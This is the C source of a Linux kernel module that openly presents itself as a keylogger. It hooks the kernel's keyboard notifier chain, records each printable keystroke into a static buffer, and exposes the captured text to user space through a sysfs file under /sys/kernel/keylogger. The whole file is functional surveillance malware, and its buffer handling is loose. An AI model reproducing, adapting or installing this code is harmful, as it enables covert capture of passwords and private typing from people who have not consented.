#include <linux/kobject.h>
#include <linux/string.h>
#include <linux/sysfs.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/keyboard.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/notifier.h>

#define BUFFER_SIZE 1024 //max buffer size
#define START_OF_HEADING 0x01  
#define NEW_LINE 0x0a //new line in aschii 
#define SPACE 0x20 //first aschii character
#define DEL 0x7f //last aschii character


static char buffer[BUFFER_SIZE];   //buffer that contains all logged keys
static char *buffer_ptr = buffer; 
int position = 0;

static struct kobject *keylogger_kobj; 
int log;

/*
 * The log file where is read from the data
  return the buffer size 
 */
static ssize_t log_show(struct kobject *kobj, struct kobj_attribute *attr,char *buf)
{
	int dataLen = scnprintf(buf, BUFFER_SIZE,"%s\n", buffer);
	memset(buffer, 0, BUFFER_SIZE); 
	buffer_ptr = buffer; 
	return dataLen;
}

// press_notify its called when the keyboard keys clickd 
//this function addes to the buffer the aschii character 
// return NOTIFY_OK or -EFAULT
static int press_notify(struct notifier_block *notify_blk, unsigned long val, void *data) {


	struct keyboard_notifier_param *notify_param = data;
	char ascii;
	
	// not interested  in KBD_KEYSYM 
	// KBD_KEYSYM : events are sent if the translation from the keycode to a valid character produced a non-unicode character
	if (val != KBD_KEYSYM ) 
		return -EFAULT;
		
	//when the user pressed down the key
	if (notify_param->down ) 
		return -EFAULT;

	//	the param aschii value
	 ascii = notify_param->value;
	
	//we just interested with  aschii character
	if (ascii == START_OF_HEADING) {
		//aschii new line
		*(buffer_ptr++) = NEW_LINE;
		position++;
	} 
	else if (ascii < DEL&&ascii >= SPACE ) {
		*(buffer_ptr++) = ascii;
		position++;
	}

	//buffer overflow will reset the buffer		
	if (position >= BUFFER_SIZE) {    
	    memset(buffer, 0, BUFFER_SIZE);
	    buffer_ptr = buffer;
	    position = 0;
	}

	//was processed correctly			
	return NOTIFY_OK;
}

//The main structure used in Notification Chains is notifier_block
static struct notifier_block notify_blk = {
	.notifier_call = press_notify
};

/* Sysfs  log attributes  */
static struct kobj_attribute log_attribute =
	__ATTR(log, 0664, log_show, NULL);

/*
 * Create a group of attributes so that we can create and destroy them all
 * at once.
 */
static struct attribute *attrs[] = {
	&log_attribute.attr,
	NULL,	
};

/*
 * An unnamed attribute group will put all of the attributes directly in
 * the kobject directory.  If we specify a name, a subdirectory will be
 * created for the attributes with the directory being the name of the
 * attribute group.
 */
static struct attribute_group attr_group = {
	.attrs = attrs,
};


// keylogger init in this function the module create node in /sys/kernel/keylogger/log to pass data to user space

static int __init keylogger_init(void){
	
	int retval;
	/*
	 * Create a simple kobject with the name of "kobject_example",
	 * located under /sys/kernel/
	 *
	 * As this is a simple directory, no uevent will be sent to
	 * userspace.  That is why this function should not be used for
	 * any type of dynamic kobjects, where the name and number are
	 * not known ahead of time.
	 */
	keylogger_kobj = kobject_create_and_add("keylogger", kernel_kobj);
	
	if (!keylogger_kobj)
		return -ENOMEM;

	/* Create the files associated with this kobject */	
	retval = sysfs_create_group(keylogger_kobj, &attr_group);
	if (retval)
		kobject_put(keylogger_kobj);
		
	printk(KERN_INFO " keylogger created \n");	
	
	//register notify_blk to  Keyboard Notification Chain
 	register_keyboard_notifier(&notify_blk);
	 //initialize the buffer
 	memset(buffer, 0, BUFFER_SIZE);
  return 0;
}
static void __exit keylogger_exit(void){
	
	//destroy the keylogger_kobj
	kobject_put(keylogger_kobj);
	///unregister notify_blk to  Keyboard Notification Chain
	unregister_keyboard_notifier(&notify_blk);
  return;
}


module_init(keylogger_init);
module_exit(keylogger_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("abdalla-shorok");
MODULE_DESCRIPTION("keylogger module");
MODULE_VERSION("1.0");
